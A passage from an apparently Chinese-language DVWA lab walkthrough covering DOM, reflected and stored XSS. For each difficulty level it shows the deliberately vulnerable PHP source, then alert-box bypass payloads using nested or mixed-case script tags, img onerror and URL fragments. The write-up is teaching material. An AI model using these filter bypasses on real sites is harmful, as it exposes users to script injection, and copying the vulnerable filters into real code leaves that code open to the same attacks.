<h2 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h2><h3 id="源码-34"><a href="#源码-34" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用了白名单模式，如果 <code>default</code> 的值不是白名单内的值就重置 URL 为 <code>?default=English</code> </p>
<h3 id="漏洞利用-29"><a href="#漏洞利用-29" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>只对 <code>default</code> 变量进行了过滤</p>
<ul>
<li>可使用 <code>&amp;</code> 连接另一个自定义变量绕过</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">?<span class="keyword">default</span>=English&amp;a=&lt;input onclick=alert(<span class="string">&#x27;XSS&#x27;</span>) /&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>#</code> 绕过</li>
</ul>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"></span><br><span class="line">?default=English#&lt;input onclick=alert(&#x27;XSS&#x27;) /&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-35"><a href="#源码-35" class="headerlink" title="源码"></a>源码</h3><p>后端源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"><span class="comment"># 无需对客户端进行任何处理和保护</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>前端工作源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For the impossible level, don&#x27;t decode the querystring</span></span><br><span class="line"><span class="variable">$decodeURI</span> = <span class="string">&quot;decodeURI&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$vulnerabilityFile</span> == <span class="string">&#x27;impossible.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$decodeURI</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接不对输入参数进行 URL 解码了，这样会导致标签实效，从而无法 XSS</p>
<h1 id="XSS-Reflected-（Reflected-Cross-Site-Scripting-反射型-XSS）"><a href="#XSS-Reflected-（Reflected-Cross-Site-Scripting-反射型-XSS）" class="headerlink" title="XSS (Reflected) （Reflected Cross Site Scripting,反射型 XSS）"></a>XSS (Reflected) （Reflected Cross Site Scripting,反射型 XSS）</h1><h2 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-36"><a href="#源码-36" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>变量 <code>name</code> 为做任何过滤，只是检查是否为空。</p>
</blockquote>
<h3 id="漏洞利用-30"><a href="#漏洞利用-30" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-37"><a href="#源码-37" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>简单的过滤了 <code>&lt;script&gt;</code> 标签，由于通过正则匹配将检测到的敏感字符替换为空(删除)可使用嵌套和大小写转换绕过，也可使用其他标签绕过。</p>
</blockquote>
<h3 id="漏洞利用-31"><a href="#漏洞利用-31" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;s&lt;script&gt;cript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=x onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="High-10"><a href="#High-10" class="headerlink" title="High"></a>High</h2><h3 id="源码-38"><a href="#源码-38" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>正则过滤表更加完善，不区大小写，并通过通配符匹配，使嵌套构造当方式也不能成功，但还有其他很多标签可达到弹框效果。</p>
</blockquote>
<h3 id="漏洞利用-32"><a href="#漏洞利用-32" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Impossible-10"><a href="#Impossible-10" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-39"><a href="#源码-39" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="XSS-Stored-（Stored-Cross-Site-Scripting，存储型-XSS）"><a href="#XSS-Stored-（Stored-Cross-Site-Scripting，存储型-XSS）" class="headerlink" title="XSS (Stored) （Stored Cross Site Scripting，存储型 XSS）"></a>XSS (Stored) （Stored Cross Site Scripting，存储型 XSS）</h1><h2 id="Low-12"><a href="#Low-12" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-40"><a href="#源码-40" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>trim(string,charlist)</code> 移除字符串两侧的指定字符。<code>string</code> 必需，指定要检查的字符串；<code>charlist</code> 可选，指定从字符串中删除的字符，若干未指定，则移除 <code>\0(null) , \t(制表符) , \n(换行) , \x0B(垂直制表符) , \r(回车) , 空格</code><br><code>stripslashes(string)</code> 去除字符串的反斜杠，可用于清理从数据库中或从 HTML 表单中取回的数据。<br><code>mysqli_real_escape_string(string,connection)</code> 转义 SQL 语句中使用的字符串中的特殊字符。<code>string</code> 必需，指定要转义的字符串；<code>connection</code> 可选，指定 MySQL 连接，若未指定，则使用上一个连接；将会转义的字符 <code>\x00 , \n , \r , \ , &#39; , &quot; , \xla</code></p>
</blockquote>
<p>这些函数都只对数据库进行了防护，却没有考虑到对 XSS 进行过滤</p>
<h3 id="漏洞利用-33"><a href="#漏洞利用-33" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">Name: xsstest</span><br><span class="line">Message: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>到数据库中查询 <code>select * from guestook;</code> 提交的结果被插入到了数据库中</p>
<p>测试完成后为了不影响下面的测试，检验手动删除数据库中的记录。</p>
<h2 id="Medium-11"><a href="#Medium-11" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-41"><a href="#源码-41" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>addslashes(string)</code> 返回在预定字符之前添加反斜杠的字符串。预定字符： <code>&#39; , &quot; , \ , null</code><br><code>strip_tags(string,allow)</code> 剔去字符串中 HTML 、 XML 以及 PHP 的标签。 <code>string</code> 必需,指定检查的字符串；<code>allow</code> 可选，规定不被删除的标签。<br><code>htmlspecialchars(string,flags,character-det,double_encode)</code> 包预定字符转换为 HTML 实体，预定字符: <code>&amp; , &#39; , &quot; , &lt; , &gt;</code></p>
</blockquote>
<p><code>message</code> 变量几乎把所有的 XSS 都过滤了，但 name 只过滤了 <code>&lt;script&gt;</code> 标签而已，我们依然可在 <code>name</code> 参数尝试使用其他标签来触发弹框。</p>
<h3 id="漏洞利用-34"><a href="#漏洞利用-34" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>name</code> 的 input 输入文本框限制了长度，可通过审查元素手动将 <code>maxlength</code> 的值调大。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;txtName&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">size</span>=<span class="string">&quot;30&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;50&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用嵌套或大小写变化绕过</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Name: &lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">Name: &lt;Script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>使用其他标签弹框</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">Name: &lt;img src=x onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">Message: testxss</span><br></pre></td></tr></table></figure>
<h2 id="High-11"><a href="#High-11" class="headerlink" title="High"></a>High</h2><h3 id="源码-42"><a href="#源码-42" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>message</code> 变量依然没有希望，<code>name</code> 变量只加强过滤 <code>script</code> 标签，依然可使用其他标签绕过</p>
<h3 id="漏洞利用-35"><a href="#漏洞利用-35" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">Name: &lt;img src=a onerror=alert(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">Message: testxss</span><br></pre></td></tr></table></figure>
<h2 id="Impossible-11"><a href="#Impossible-11" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-43"><a href="#源码-43" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> );</span><br><span class="line">    <span class="variable">$message</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$message</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    <span class="variable">$name</span> = stripslashes( <span class="variable">$name</span> );</span><br><span class="line">    <span class="variable">$name</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$name</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$name</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:message&#x27;</span>, <span class="variable">$message</span>, PDO::PARAM_STR );</span><br><span class="line">    <span 